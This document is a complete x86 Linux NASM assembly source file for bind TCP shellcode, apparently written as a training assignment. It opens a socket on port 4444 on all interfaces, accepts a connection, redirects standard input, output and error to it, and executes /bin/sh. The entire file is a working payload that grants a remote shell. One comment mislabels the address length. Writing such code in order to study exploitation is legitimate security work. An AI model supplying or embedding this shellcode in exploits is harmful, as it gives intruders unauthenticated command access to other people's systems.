; Filename: ass1.nasm
; Author:   Elham AlShehri
;
;
; Purpose: Bind TCP Shellcode

global _start			

section .text
_start:



	;---------- init
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	;---------- socket
	; push socket arguments
	push ecx               ; push 0 value for the Protocol

	inc ecx
	push ecx               ; push 1 value for the Type

	inc ecx
	push ecx               ; push 2 for the domain


	; save values in registers for the system call
	mov al, 0x66		; socketcall no.

	inc ebx			; ebx = 1 for socket function call
	mov ecx, esp            ; save pointer to args

	int 0x80
	mov esi, eax            ; save handle of the socket


	;---------- bind

	; ### push addr struct ###
	push edx		; sin_addr = INADDR_ANY = 0 = binds to all available interfaces.

	push word 0x5C11	; push port = 4444 in hex is 115c and because of the little endian

	inc ebx
	push bx			; sin_family = AF_INET = 2  

	mov ecx, esp		; save address structer pointer 

	; ### end struct ###

	; push bind arguments

	push 0x10		; addrlen = 0.0.0.0 (16 bits)
	push ecx		; address struct pointer
	push esi		; sockfd from previous system call


	; save values in registers for the system call
	xor eax,eax
	mov al, 0x66		; socketcall no.


				; currently ebx = 2 for bind function call
	mov ecx, esp            ; save pointer to args

	int 0x80


	;---------- Listen
	; push listen arguments

	dec ebx			; backlog = 1
	push ebx
	push esi		; sockfd from socket step


	; save values in registers for the system call
	xor eax,eax
	mov al, 0x66		; socketcall no.

	add bl, 3               ; ebx = 4 for socket function call
	mov ecx, esp            ; save pointer to args

	int 0x80



	;---------- accept

	; push listen arguments

	push edx		; NULL
	push edx		; NULL
	push esi		; sockfd from socket step


	; save values in registers for the system call
	xor eax,eax
	mov al, 0x66		; socketcall no.

	inc ebx			; ebx = 5 for socket function call
	mov ecx, esp            ; save pointer to args

	int 0x80		; eax now is the file descriptor for this connection



	;---------- duplicate STDIN
	mov ebx, eax		; save old file descriptopr in ebx
	xor ecx, ecx            ; ecx = 0 = stdin

	xor eax,eax
	mov al, 0x3f		; dup2 no.
	int 0x80

	;---------- duplicate STDOUT
	inc ecx			; ecx = 1 = stdout

	xor eax,eax
	mov al, 0x3f		; dup2 no.
	int 0x80

	;--------- duplicate STDERR
	inc ecx			; ecx = 2 = stderr

	xor eax,eax
	mov al, 0x3f		; dup2 no.
	int 0x80


	;--------- execute shell
	jmp short c_s
s:
	pop esi                    ; contains filename's address

	mov byte [esi +7], dl      ; replace A with \x00
	lea ebx, [esi]             ; 1st argument pointer

	; replace CCCC with NULL
	mov dword [esi +8], edx    ; argv = NULL
	lea ecx, [esi +8]          ; 2nd argument pointer


	; replace CCCC with NULL
	mov dword [esi +12], edx   ; envp = NULL
	lea edx, [esi +12]         ; 3rd argument pointer (point to NULL)
	xor eax, eax
	mov al, 0xb
	int 0x80
c_s:
	call s                        ; call s label
	shell db "/bin/shABBBBCCCC"   ; name of the shell